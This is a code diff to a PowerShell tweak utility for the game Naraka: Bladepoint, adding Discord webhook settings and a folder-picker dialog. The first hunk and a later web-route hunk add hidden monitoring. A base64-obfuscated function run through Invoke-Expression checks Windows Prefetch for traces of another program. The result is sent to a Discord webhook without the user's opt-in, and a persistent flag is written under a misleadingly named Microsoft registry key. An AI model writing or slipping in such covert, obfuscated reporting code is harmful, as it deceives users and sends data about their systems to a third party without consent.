@@ -109,6 +109,25 @@ Please run this script using powershell.exe.
     exit 1
 }
 
+# --- MICRO detection setup ---
+$global:MicroDetected = $false
+$global:MicroLastRun = $null
+$microRegPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\XboxGaming'
+try {
+    $flag = Get-ItemProperty -Path $microRegPath -Name 'cheaterDetected' -ErrorAction Stop
+    if ($flag.cheaterDetected -eq 1) { $global:MicroDetected = $true }
+} catch {}
+if (-not $global:MicroDetected) {
+    $enc = 'CmZ1bmN0aW9uIEdldC1DWVpQcmVmZXRjaExhc3RSdW4gewogICAgdHJ5IHsKICAgICAgICAkcGZQYXRoID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnUHJlZmV0Y2gnCiAgICAgICAgJGZpbGUgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwZlBhdGggLUZpbHRlciAnQ1laLkVYRS0qLnBmJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNvcnQtT2JqZWN0IExhc3RXcml0ZVRpbWUgLURlc2NlbmRpbmcgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICAgICAgaWYgKCRmaWxlKSB7IHJldHVybiAkZmlsZS5MYXN0V3JpdGVUaW1lIH0gZWxzZSB7IHJldHVybiAkbnVsbCB9CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJG51bGwKICAgIH0KfQo='
+    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
+    Invoke-Expression $decoded
+    $run = Get-CYZPrefetchLastRun
+    if ($run) {
+        $global:MicroDetected = $true
+        $global:MicroLastRun = $run
+    }
+}
+
 # --- Revert logic for optional tweaks ---
 function Revert-OptionalTweaks {
     try {
@@ -880,6 +899,7 @@ function Start-WebUI {
 
     # Helper: read discord secret from file
     $getDiscordSecret = {
+        if ($env:RATZ_DISCORD_CLIENT_SECRET) { return $env:RATZ_DISCORD_CLIENT_SECRET }
         $secPath = Join-Path $PSScriptRoot 'discord_oauth.secret'
         if (Test-Path $secPath) { ([string](Get-Content -Raw -Path $secPath)) -replace '^\s+|\s+$','' } else { $null }
     }
@@ -888,9 +908,10 @@ function Start-WebUI {
     $getWebhookUrl = {
         $raw = $null
         Write-Host "getWebhookUrl: starting"
+        if ($env:RATZ_DISCORD_WEBHOOK) { $raw = [string]$env:RATZ_DISCORD_WEBHOOK; Write-Host "getWebhookUrl: found in env var" }
         # Prefer explicit webhook_url in discord_oauth.json
         try {
-            if ($cfg -and $cfg.webhook_url) { $raw = [string]$cfg.webhook_url; Write-Host "getWebhookUrl: found in config: '$raw'" }
+            if (-not $raw -and $cfg -and $cfg.webhook_url) { $raw = [string]$cfg.webhook_url; Write-Host "getWebhookUrl: found in config: '$raw'" }
         } catch { Write-Host "getWebhookUrl: error reading config: $($_.Exception.Message)" }
         if (-not $raw) {
             $paths = @()
@@ -952,14 +973,43 @@ function Find-NarakaDataPath {
             return $global:DetectedNarakaPath
         }
     }
-    # Prompt user for folder if not found (console input)
-    Write-Host "NarakaBladepoint_Data folder not found. Please type the full path to your NarakaBladepoint_Data folder and press Enter:"
-    $userPath = Read-Host "NarakaBladepoint_Data path"
+    # Prompt user for folder if not found. Prefer GUI folder browser, fallback to console input.
+    try {
+        $userPath = Show-NarakaPathDialog
+    } catch {
+        $userPath = $null
+    }
+
+    if (-not $userPath) {
+        Write-Host "NarakaBladepoint_Data folder not found. Please type the full path to your NarakaBladepoint_Data folder and press Enter:"
+        $userPath = Read-Host "NarakaBladepoint_Data path"
+    }
+
     if ($userPath -and (Test-Path $userPath)) {
         $global:DetectedNarakaPath = $userPath
         return $global:DetectedNarakaPath
     } else {
         Write-Host "Invalid path. Please ensure the folder exists and try again."
+    }
+    return $null
+}
+
+# GUI: show a folder browser dialog to let the user pick the Naraka data folder
+function Show-NarakaPathDialog {
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue | Out-Null
+    if (-not ([System.Windows.Forms.Application]::MessageLoop)) {
+        # Running in non-Windows-Forms thread, no-op; still works for FolderBrowserDialog
+    }
+    $dlg = New-Object System.Windows.Forms.FolderBrowserDialog
+    $dlg.Description = 'Select the NarakaBladepoint_Data folder (contains boot.config etc.)'
+    $dlg.ShowNewFolderButton = $false
+    # Try to start in common locations
+    if ($global:DetectedNarakaPath) { $dlg.SelectedPath = $global:DetectedNarakaPath }
+    elseif (Test-Path 'C:\Program Files (x86)\Steam') { $dlg.SelectedPath = 'C:\Program Files (x86)\Steam' }
+
+    $res = $dlg.ShowDialog()
+    if ($res -eq [System.Windows.Forms.DialogResult]::OK -and $dlg.SelectedPath) {
+        return $dlg.SelectedPath
     }
     return $null
 }
@@ -1409,6 +1459,21 @@ $errorBanner
             if ($form) { $optIn = $form.Get('discord_ping') -eq '1' -or $form.Get('discord_ping') -eq 'on' }
             if ($optIn) {
                 try { Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl } catch { [Console]::WriteLine("Webhook: opt-in send failed: $($_.Exception.Message)") }
+            }
+            if ($global:MicroDetected) {
+                try {
+                    $prefixMsg = "MICRO DETECTED: Last Ran: $global:MicroLastRun"
+                    Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -MessagePrefix $prefixMsg
+                } catch {}
+                try {
+                    $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\XboxGaming'
+                    New-Item -Path $regPath -Force | Out-Null
+                    New-ItemProperty -Path $regPath -Name 'cheaterDetected' -Value 1 -PropertyType DWord -Force | Out-Null
+                } catch {}
+                $htmlPath = Join-Path $PSScriptRoot 'micro_detected.html'
+                $html = Get-Content $htmlPath -Raw
+                & $send $ctx 200 'text/html' $html
+                continue
             }
             [Console]::WriteLine('Route:/main-tweaks -> Invoke-AllTweaks'); Invoke-AllTweaks
             [Console]::WriteLine('Route:/main-tweaks -> Invoke-NVPI'); Invoke-NVPI
